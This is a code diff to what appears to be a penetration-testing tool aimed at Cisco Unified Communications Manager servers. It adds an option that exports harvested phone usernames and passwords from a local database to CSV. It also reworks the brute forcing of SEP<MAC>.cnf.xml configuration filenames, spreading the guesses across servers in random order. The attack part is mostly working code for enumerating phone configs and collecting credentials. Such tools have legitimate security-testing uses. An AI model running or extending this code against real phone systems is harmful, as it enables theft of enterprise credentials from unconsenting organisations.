@@ -340,7 +340,7 @@ def get_version(cucm_host):
 
 def get_hostname_from_phone(phone_ip):
     if _TEST_MODE:
-        return "SEPTEST00000000"
+        return os.getenv("THIEF_TEST_PHONE_HOSTNAME") or "SEPTEST00000000"
 
     try:
         url = f'http://{phone_ip}/NetworkConfiguration'
@@ -1108,6 +1108,39 @@ if __name__ == '__main__':
     if args.show_db:
         db_file = args.db
         cucm_filter = args.host
+        if args.csv:
+            # Export only devices with passwords (credentials) to CSV
+            try:
+                if not os.path.exists(db_file):
+                    print(f'[-] Database not found: {db_file}')
+                    print(f'[-] Run a scan first to populate the database')
+                    quit(1)
+                conn = sqlite3.connect(db_file)
+                cursor = conn.cursor()
+                # Get credentials (only those with a password)
+                if cucm_filter:
+                    cursor.execute('''
+                        SELECT cucm_host, device, username, password, discovery_time 
+                        FROM credentials 
+                        WHERE cucm_host = ? AND password IS NOT NULL AND password != ''
+                        ORDER BY discovery_time DESC, device
+                    ''', (cucm_filter,))
+                else:
+                    cursor.execute('''
+                        SELECT cucm_host, device, username, password, discovery_time 
+                        FROM credentials 
+                        WHERE password IS NOT NULL AND password != ''
+                        ORDER BY discovery_time DESC, device
+                    ''')
+                credentials = cursor.fetchall()
+                conn.close()
+                csv_filename = args.csv if args.csv != True else 'seeyoucm_results.csv'
+                # Only export credentials (no usernames-only rows)
+                cred_rows = [(c[2], c[3], c[1]) for c in credentials]  # (username, password, device)
+                export_to_csv(cred_rows, [], csv_filename)
+                print(f'[+] Exported credentials (with passwords) to CSV: {csv_filename}')
+            except Exception as e:
+                print(f'[-] Error exporting credentials to CSV: {e}')
         display_database_summary(db_file, cucm_filter)
         quit(0)
 
@@ -1250,18 +1283,18 @@ if __name__ == '__main__':
         for partial_mac in all_found_macs:
             phone_cucm = mac_to_cucm[partial_mac]
             if phone_cucm not in candidates_by_cucm:
-                candidates_by_cucm[phone_cucm] = []
+                candidates_by_cucm[phone_cucm] = set()
             for i in range(max_variations):
-                suffix = f'{i:0{brute_mac_len}X}'
-                # Pad suffix with leading zeros if needed
-                suffix = suffix.zfill(brute_mac_len)
+                suffix = f'{i:0{brute_mac_len}X}'.zfill(brute_mac_len)
                 # Always ensure full_mac is 12 characters
                 full_mac = (partial_mac + suffix)[:12]
                 filename = f'SEP{full_mac}.cnf.xml'
-                candidates_by_cucm[phone_cucm].append((phone_cucm, full_mac, filename))
+                candidates_by_cucm[phone_cucm].add((phone_cucm, full_mac, filename))
 
         # Randomize per-CUCM queues, then interleave to distribute load across servers
         for cucm in candidates_by_cucm:
+            # Convert set to list and shuffle
+            candidates_by_cucm[cucm] = list(candidates_by_cucm[cucm])
             random.shuffle(candidates_by_cucm[cucm])
 
         all_candidates = []
@@ -1362,6 +1395,7 @@ if __name__ == '__main__':
                                 # Update progress bar title with current count
                                 prog_bar.title(f"> Brute forcing {len(all_found_macs)} MAC prefix(es) | Found: {successful}")
 
+                            # Always increment progress bar for each candidate processed
                             prog_bar()
 
                         except queue.Empty:
